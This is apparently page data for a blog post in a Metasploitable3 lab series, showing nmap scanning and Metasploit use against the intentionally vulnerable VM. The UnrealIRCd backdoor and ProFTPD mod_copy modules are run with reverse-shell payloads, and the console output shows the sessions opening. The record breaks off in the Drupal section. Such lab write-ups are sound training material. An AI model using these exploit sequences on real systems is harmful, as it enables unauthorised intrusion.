{"componentChunkName":"component---src-templates-blog-post-js","path":"/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2/","result":{"data":{"site":{"siteMetadata":{"title":"Thomas Laurenson"}},"markdownRemark":{"id":"970a8eee-dcd0-514b-be8e-4e40e041b41f","excerpt":"This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series: Part 1: Building the Ubuntu Linux…","html":"<p>This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series:</p>\n<ul>\n<li>Part 1: <a href=\"/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/\">Building the Ubuntu Linux Version</a></li>\n<li>Part 2: <a href=\"/blog/2018-07-04-metasploitable3-customizing-the-ubuntu-linux-version\">Customizing the Ubuntu Linux Version</a></li>\n<li>Part 3: <a href=\"/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1\">Pentesting the Ubuntu Linux Version - SQL Injection</a></li>\n<li>Part 4: <a href=\"/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2\">Pentesting the Ubuntu Linux Version - Attacking Services</a> (You are here!)</li>\n</ul>\n<h2 id=\"contents\" style=\"position:relative;\"><a href=\"#contents\" aria-label=\"contents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Contents</h2>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#introduction\">Introduction</a></li>\n<li><a href=\"#configuring-the-metasploit-framework\">Configuring the Metasploit Framework</a></li>\n<li><a href=\"#port-6697-unrealircd\">Port 6697: UnrealIRCd</a></li>\n<li><a href=\"#port-21-proftpd-version-135\">Port 21: ProFTPD version 1.3.5</a></li>\n<li><a href=\"#port-80-drupal\">Port 80: Drupal</a></li>\n<li><a href=\"#resources\">Resources</a></li>\n<li><a href=\"#conclusion\">Conclusion</a></li>\n</ul>\n</div>\n<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>My previous three posts of Metasploitable3 covered <a href=\"/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/\">Building Metasploitable3</a>, <a href=\"/blog/2018-07-04/metasploitable3-customizing-the-ubuntu-linux-version\">Customizing Metasploitable3</a> and <a href=\"/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1\">Pentesting Metasploitable3 using SQL Injection</a>. This post continues with the series that is specifically targeted to the Ubuntu Linux version of Metasploitable3. In this post, we continue with the pentest of Metasploitable3 this time attacking vulnerable services using the Metasploit Framework. </p>\n<p>If you have not followed my Metasploitable3 Ubuntu Linux version series - here is a summary of the network configuration. In my tutorial Metasploitable3 has a <em>Host-Only</em> network configuration with the IP address of: <code class=\"language-text\">192.168.19.20</code>. While, Kali Linux (version 2018.2) is used as the attack system, again, with <em>Host-Only</em> network configuration with the IP address of: <code class=\"language-text\">192.168.19.10</code>.</p>\n<h2 id=\"configuring-the-metasploit-framework\" style=\"position:relative;\"><a href=\"#configuring-the-metasploit-framework\" aria-label=\"configuring the metasploit framework permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Configuring the Metasploit Framework</h2>\n<p>If you have not followed my Metasploitable3 Ubuntu Linux version series - start by performing a port scan of the Metasploitable3 system.</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">root@kali:~# nmap -sV -Pn -T4 -p 1-65535 -oX metasploitable3.xml 192.168.19.20</code></pre></div>\n<p>This is a basic go-to <code class=\"language-text\">nmap</code> port scan which queries all available ports (<code class=\"language-text\">-p 1-65535</code>), includes service version detection (<code class=\"language-text\">-sV</code>) and saves the results to an XML file type with the name <code class=\"language-text\">metasploitable3.xml</code>. The purpose of saving the <code class=\"language-text\">nmap</code> port scan is to import these results into the Metasploit Framework. To achieve this, we need to create a database. Initialize the Metasploit Framework database using the following command:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">root@kali:~# msfdb init\n[+] Starting database\n[+] Creating database user 'msf'\n[+] Creating databases 'msf'\n[+] Creating databases 'msf_test'\n[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'\n[+] Creating initial database schema</code></pre></div>\n<p>If you receive an error, you might need to start the PostgreSQL database using the following command:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">sudo systemctl start postgresql</code></pre></div>\n<p>Now we can start the Metasploit Framework Console, otherwise known as <em>msfconsole</em> and started with the command <code class=\"language-text\">msfconsole</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">root@kali:~# msfconsole \n\n       =[ metasploit v4.16.48-dev                         ]\n+ -- --=[ 1749 exploits - 1002 auxiliary - 302 post       ]\n+ -- --=[ 536 payloads - 40 encoders - 10 nops            ]\n+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\n\nmsf > </code></pre></div>\n<p>Best practice dictates that we load in the <code class=\"language-text\">nmap</code> port scan using the <code class=\"language-text\">db_import</code> command and passing the file name of the <code class=\"language-text\">nmap</code> port scan. This tutorial expects that you started the Metasploit Framework in the same directory as the port scan file. If not, you can use an absolute path to indicate the location of the port scan file. </p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">msf > db_import metasploitable3.xml\n[*] Importing 'Nmap XML' data\n[*] Import: Parsing with 'Nokogiri v1.8.2'\n[*] Importing host 192.168.19.20\n[*] Successfully imported /root/metasploitable3.xml</code></pre></div>\n<p>Try the <code class=\"language-text\">hosts</code> and <code class=\"language-text\">services</code> commands to check if the database is loaded and functioning correctly:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">msf > hosts\n\nHosts\n=====\n\naddress        mac                name  os_name  os_flavor  os_sp  purpose  info  comments\n-------        ---                ----  -------  ---------  -----  -------  ----  --------\n192.168.19.20  00:0c:29:00:43:58        Unknown                    device</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">msf > services\nServices\n========\n\nhost           port  proto  name         state   info\n----           ----  -----  ----         -----   ----\n192.168.19.20  21    tcp    ftp          open    ProFTPD 1.3.5\n192.168.19.20  22    tcp    ssh          open    OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 Ubuntu Linux; protocol 2.0\n192.168.19.20  80    tcp    http         open    Apache httpd 2.4.7\n192.168.19.20  445   tcp    netbios-ssn  open    Samba smbd 3.X - 4.X workgroup: WORKGROUP\n192.168.19.20  631   tcp    ipp          open    CUPS 1.7\n192.168.19.20  3000  tcp    ppp          closed  \n192.168.19.20  3306  tcp    mysql        open    MySQL unauthorized\n192.168.19.20  3500  tcp    http         open    WEBrick httpd 1.3.1 Ruby 2.3.7 (2018-03-28)\n192.168.19.20  6697  tcp    irc          open    UnrealIRCd\n192.168.19.20  8181  tcp    http         open    WEBrick httpd 1.3.1 Ruby 2.3.7 (2018-03-28)</code></pre></div>\n<p>With these configurations set, we are ready to start exploiting vulnerabilities. Well, first finding the vulnerabilities… then exploiting them! The following sections discuss a pentest which is formatted into sections based on the port number of the service running on Metasploitable3.</p>\n<h2 id=\"port-6697-unrealircd\" style=\"position:relative;\"><a href=\"#port-6697-unrealircd\" aria-label=\"port 6697 unrealircd permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Port 6697: UnrealIRCd</h2>\n<p>I have previously encountered UnrealIRCd in Metasploitable2. Searching the Metasploit Framework database (using <code class=\"language-text\">search unrealircd</code>) only yielded one search hit. This was the same vulnerability and associated exploit used in Metasploitable2. The same of the exploit is:</p>\n<ul>\n<li>exploit/unix/irc/unreal<em>ircd</em>3281_backdoor</li>\n</ul>\n<p>I could not determine the specific version on Metasploitable3, but decided to give the exploit a whirl:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">msf > use exploit/unix/irc/unreal_ircd_3281_backdoor\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhost 192.168.19.20\nrhost => 192.168.19.20\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697\nrport => 6697\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_ruby\npayload => cmd/unix/reverse_ruby\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost 192.168.19.10\nlhost => 192.168.19.10\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > set lport 2345\nlport => 2345\n\nmsf exploit(unix/irc/unreal_ircd_3281_backdoor) > run</code></pre></div>\n<p>I am not a pentester by trade, or is it something that I do very often… but I thought this was a little simple! I am guessing that the single available exploit for UnrealIRCd made this a little too easy. Anyway, after running the exploit, remote access was gained:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run\n\n[*] Started reverse TCP handler on 192.168.19.10:2345 \n[*] 192.168.19.20:6697 - Connected to 192.168.19.20:6697...\n    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...\n[*] 192.168.19.20:6697 - Sending backdoor command...\n[*] Command shell session 1 opened (192.168.19.10:2345 -> 192.168.19.20:49971) at 2018-07-07 22:47:02 -0400</code></pre></div>\n<p>Running the <code class=\"language-text\">whoami</code> command indicated that I had gained remote access using the <code class=\"language-text\">boba_fett</code> account. I felt like a bounty hunter! I thought it was interesting that I couldn’t traverse the file system using this exploit, rather I was stuck in the <code class=\"language-text\">/opt/unrealircd/Unreal3.2</code> directory, but could navigate the file system by listing directories seeing what was around. I though it strange that after listing the <code class=\"language-text\">/home</code> folder, and the user who was in the group names <em>users</em> had read and execute permission on all home directories.</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">ls -la /home/\ntotal 72\ndrwxr-xr-x 18 root             root    4096 Jul  2 21:26 .\ndrwxr-xr-x 24 root             root    4096 Jul  2 22:26 ..\ndrwxr-xr-x  3 anakin_skywalker users   4096 Jul  2 21:47 anakin_skywalker\ndrwxr-xr-x  3 artoo_detoo      users   4096 Jul  2 21:47 artoo_detoo\ndrwxr-xr-x  2 ben_kenobi       users   4096 Jul  2 21:26 ben_kenobi\ndrwxr-xr-x  2 boba_fett        users   4096 Jul  2 21:26 boba_fett\ndrwxr-xr-x  2 c_three_pio      users   4096 Jul  2 21:26 c_three_pio\ndrwxr-xr-x  2 chewbacca        users   4096 Jul  2 21:26 chewbacca\ndrwxr-xr-x  2 darth_vader      users   4096 Jul  2 21:26 darth_vader\ndrwxr-xr-x  2 greedo           users   4096 Jul  2 21:26 greedo\ndrwxr-xr-x  2 han_solo         users   4096 Jul  2 21:26 han_solo\ndrwxr-xr-x  2 jabba_hutt       users   4096 Jul  2 21:26 jabba_hutt\ndrwxr-xr-x  2 jarjar_binks     users   4096 Jul  2 21:26 jarjar_binks\ndrwxr-xr-x  4 kylo_ren         users   4096 Jul  2 21:47 kylo_ren\ndrwxr-xr-x  2 lando_calrissian users   4096 Jul  2 21:26 lando_calrissian\ndrwxr-xr-x  3 leia_organa      users   4096 Jul  7 22:24 leia_organa\ndrwxr-xr-x  2 luke_skywalker   users   4096 Jul  2 21:26 luke_skywalker\ndrwxr-xr-x  5 vagrant          vagrant 4096 Jul  3 00:02 vagrant</code></pre></div>\n<p>Unfortunately, <code class=\"language-text\">sudo</code> or <code class=\"language-text\">root</code> access was not possible as this exploit gained access using the <code class=\"language-text\">boba_fett</code> account, who was not in the <code class=\"language-text\">sudo</code> group (as indicated by the <code class=\"language-text\">groups</code> command). However, <code class=\"language-text\">boba_fett</code> was part of the <code class=\"language-text\">docker</code> group… interesting! Moving on!</p>\n<h2 id=\"port-21-proftpd-version-135\" style=\"position:relative;\"><a href=\"#port-21-proftpd-version-135\" aria-label=\"port 21 proftpd version 135 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Port 21: ProFTPD version 1.3.5</h2>\n<p>Looking back over the output from the <code class=\"language-text\">services</code> command in the <code class=\"language-text\">msfconsole</code>, the next prospect I choose was the FTP server running port 21.</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">192.168.19.20  21    tcp    ftp          open    ProFTPD 1.3.5</code></pre></div>\n<p>A quick <code class=\"language-text\">msfconsole</code> search yeilded the following results:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)\nexploit/linux/ftp/proftp_sreplace            2006-11-26       great      ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)\nexploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)\nexploit/linux/misc/netsupport_manager_agent  2011-01-08       average    NetSupport Manager Agent Remote Buffer Overflow\nexploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  ProFTPD-1.3.3c Backdoor Command Execution\nexploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  ProFTPD 1.3.5 Mod_Copy Command Execution</code></pre></div>\n<p>I mucked around with a few of the exploits listed but did not get very far. All the exploits were at, or below, the version of ProFTPD on Metasploitable3 (version 1.3.5). I tried the last on the list, <code class=\"language-text\">proftpd_modcopy_exec</code>. </p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">msf > use exploit/unix/ftp/proftpd_modcopy_exec\n\nmsf exploit(unix/ftp/proftpd_modcopy_exec) > set rhost 192.168.19.20\nrhost => 192.168.19.20\n\nmsf exploit(unix/ftp/proftpd_modcopy_exec) > set sitepath /var/www/html\nsitepath => /var/www/html\n\nmsf exploit(unix/ftp/proftpd_modcopy_exec) > set exploit cmd/unix/reverse_perl\nexploit => cmd/unix/reverse_perl\n\nmsf exploit(unix/ftp/proftpd_modcopy_exec) > run\n\n[*] Started reverse TCP handler on 192.168.19.10:4444 \n[*] 192.168.19.20:80 - 192.168.19.20:21 - Connected to FTP server\n[*] 192.168.19.20:80 - 192.168.19.20:21 - Sending copy commands to FTP server\n[*] 192.168.19.20:80 - Executing PHP payload /jjIRB1.php\n[*] Command shell session 4 opened (192.168.19.10:4444 -> 192.168.19.20:47618) at 2018-07-07 23:21:25 -0400</code></pre></div>\n<p>This exploit gained remote access as the <code class=\"language-text\">www-data</code> user. This was not very useful, as the UnrealIRCd exploit gained a higher level of access. Moving on!</p>\n<h2 id=\"port-80-drupal\" style=\"position:relative;\"><a href=\"#port-80-drupal\" aria-label=\"port 80 drupal permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Port 80: Drupal</h2>\n<p>In my previous post (<a href=\"%7B%25%20post_url%202018-07-08-metasploitable3-pentesting-the-ubuntu-linux-version-part1%20%25%7D\">Pentesting Metasploitable3 using SQL Injection</a>), I investigated the Apache web server running on port 80. In the directory listing provided by the web server was a Drupal install.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.48101265822784%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACX0lEQVQ4y6VUa3OiQBDk//+oiyn1EqPnCx9EK4qAgCA+QDBnCZ3pVcydfrq6reqacXe2t+eB2vl8xuFwQJIkYhPll0jT9MGnvcRe7pQ4Ho8oigKa7/sYDAZ4f5/AMAyMx2NlR6MR6vU6Go2GQqVSQa1WQ7PZxGQykfh39Pt9VKtVtU+QVLNtWwXxEonLYEPQ7XbRarWg67q6TEsMh0MFxhP0O52OUqo5joPWrzZms5lSx8PJdIogCBBFkbJhGMJ1Pcznc5imCcuy1P5qtVLZ9Ho9JYjl0Ja2iWHzGUNJkWm2RO1PkU8lDKQyqqQC/qZP5fzdbreV5T3GK4W+50LvNFWwrkvKUstupw3WNoo2WK+jGzab7dXfXM/WsrdRDfI8D3EcQwuCEC+vDTw9VeTFN0l9gp6oOp0+8S9rv9+XhMFtU0oiyi7+bgepVYGPj1xSyuWskMdyLBa57J2leWfpaiGRuYrfbrffhLGwZ1mG5TKF46T4/Myk6AdpQiJNOAjRQR5KYduMyWQvE+JM4khWXAXsroQrH2b/BX39N+LkOwXHsQSmELti56Igup6cr6ouZBzmB8K35x8wBgnm0wxZnCGORI1lw5IZ9Txf1FiqAbG8mOckwR+4Jwx8dF/rMPQEH0aKQTuBK2k6ji1EC3DwCXadZblfD4Sh1NA1Z5ibW1EUw1zsEK53oigUkpUaXoLDzU5yTNgA4nQ63Qj/akoos7Xfb2TSY+lcosj4IgnKPwH6vFTu05ZkXCTjvsbPy3VdUREoRRdVwU0ZUy39e/CMA03LT5gl0fI8V8z/C37HXF+pXKfzJ5p5NAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Directory listing of Apache on port 80\"\n        title=\"Directory listing of Apache on port 80\"\n        src=\"/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png\"\n        srcset=\"/static/9ef3e7f39a223d1e503690b2d2409fbd/c26ae/port80.png 158w,\n/static/9ef3e7f39a223d1e503690b2d2409fbd/6bdcf/port80.png 315w,\n/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png 630w,\n/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png 649w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>I found the presence of Drupal to be interesting. This was a technology that I had barely used and was interested to investigate further. A quick exploit search in the Metasploit Framework revealed a few exploits available to target Drupal. Additionally, the <code class=\"language-text\">searchsploit</code> listed even more, usually with a specific version that was vulnerable.</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Drupal OpenID External Entity Injection\nauxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Drupal Views Module Users Enumeration\nexploit/multi/http/drupal_drupageddon          2014-10-15       excellent  Drupal HTTP Parameter Key/Value SQL Injection\nexploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Drupal CODER Module Remote Command Execution\nexploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Drupal RESTWS Module Remote PHP Code Execution\nexploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution</code></pre></div>\n<p>I started by having a look over the source code for the Drupal website. I noticed some information about the website structure and different subdirectories that all originated from the Drupal folder in the <code class=\"language-text\">/var/www/html/drupal</code> directory. </p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/c8edc6bc1c5a0b99da455a07b98efa79/d0143/drupal-source-code.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.43037974683544%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACJElEQVQoz1VRa3OiQBDk//+qVF0llxhOBZSnICAP0eUhLAhq0je7xA+B6prZ2d2enl6l6zocj0ecTicURSEhclELggC7nQ/f97Hf7+U6DEO59zwnkCSJPMM5hxJEMd4WKv6pKjRNg2EYWK/XWC5X+PxUZb5araHrOtY/+7ZtwzJNbDYbwlbeWywWyLIMShwGWC1nssXHXxkFRM3zHFIUkLId/J0L1zZhWRatfWy2W7x/vFNjlRovoJIgoVwpGUn2IujqhtQksK0DtLWL7bai7jV0jZG6kkavkBxqBPuICBmCsEJ8aJDnFcqykaMzxqB0vENdNHCXLmznTIQxTC1EFPXkTYs4LkhljcOhQ5LWVMvo8o3UjOTjRIRXNM035WfprySM9zE82yUVMVw3gEG+CM9MU/hlklqd1Go0pgGH/GP5CW3XoO9bdN0FwBfGcSSl5UwY0Rg714MfELHnE5FNJKY033EcauJR7iAKI/COY7xOmKYJt9tNRvGJvKqqH4V+DNuw6GJCr+eRbyYp3MpXfJKKxzANE8f4iLYRyjpJfrlc8Lg/qMk4E7a0IYrZKUNeVmCE4lziTPFcnlHWpYysYihYQfsMTd2ADxy852h5i4EPEnVdQ6krMrw4wDt6qPsKd/qvjyvGrxHjY4ZYD/dhjo85Xu9X9Lcew23A/fuOcSIPGXkonvr19RUvf15g2RbyLEeapL+RpsjS7Fd85k9EUYS2bfEfJggmWiUTEQUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Insight into the Drupal directory structure\"\n        title=\"Insight into the Drupal directory structure\"\n        src=\"/static/c8edc6bc1c5a0b99da455a07b98efa79/f058b/drupal-source-code.png\"\n        srcset=\"/static/c8edc6bc1c5a0b99da455a07b98efa79/c26ae/drupal-source-code.png 158w,\n/static/c8edc6bc1c5a0b99da455a07b98efa79/6bdcf/drupal-source-code.png 315w,\n/static/c8edc6bc1c5a0b99da455a07b98efa79/f058b/drupal-source-code.png 630w,\n/static/c8edc6bc1c5a0b99da455a07b98efa79/40601/drupal-source-code.png 945w,\n/static/c8edc6bc1c5a0b99da455a07b98efa79/d0143/drupal-source-code.png 1025w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>I wanted to know the specific Drupal version that was running on the Metasploitable3 server. After a few Google searches and some skim-reading. I discovered a file named <code class=\"language-text\">blog.info</code> in the <code class=\"language-text\">drupal/modules/blog</code> directory that stored version information. </p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/cd90b16f93bc9a6a164533c632f13050/61c63/drupal-directory-listing.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.64556962025317%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACcElEQVQ4y41UiVLiQBTk/39pXXFRkZJCuY8QgQjIfYgBAklou58FK1i1tanqmjczb3p63pFEEARYLpdnmM/nmM1mhul0aricLxYL85U9mUzMPhwOSLTbbRQKBVQqFUOpVEI6nTakUinc39/j7u7OxoeHB7O1VywWUa1Wzc5kMra/2+2QaDabyD09mUMul8MT7Xw+j3q9jnK5bKPjOJBfo9GwuUbNBZHKT+c2mw0SbtNBuZink2PqnrlRq9Xguq4Rye50Onh9fSXB15qgea/XM3Kdy2az2G63SHguFRSzqNUb5pihdKmVo+M0GYYqVdRILMUVU3hUpUtFKnKtm0It/Lq6QvL6mofKdKTK52fc3v5hXFJ4fEybnc1mkEz+ZlyTDEkOVzwjvL29QZ+StF6vkRiNRszUhJldottdMVs+fN/nzQs+cUgVU/T7C+4tqGQOz5tz750ES2Z3jI+PDyNUZRjhZDLl9IAwPFBhSIcIURQzbhFarZhPiTAYxLQjW2s0Ql4SskRw9p0UdjotPq3A2yMiwMtLwJsDkgbY77e8KDghinaI4z0RWs19IT4nbLddxkixA2+XOmC1WltmB4MBn9c3DIdD7kVnqo6kF4QvDHSJTwOTsecGmH7/G2HPxm63eyL8TvSDsNVycXOjqgc7JuSzwTj6UAd9J/Q873T4nwq7XY9l4FpCPG/L9gnx/r5iZnsYj8dGpkrQqNba7/eGvzE8/Cyb0WjI0hlxcUaSkRGp4fUzUDkc5xrlr/XLTz8HI1SwNfH9NRc2tqg6FGQf50dbUEfoLyWo3aRYl1mnqDBV7XqSxkv7f9Dv9+0FcRzjEw4NoOPG7xrrAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Drupal directory listing\"\n        title=\"Drupal directory listing\"\n        src=\"/static/cd90b16f93bc9a6a164533c632f13050/f058b/drupal-directory-listing.png\"\n        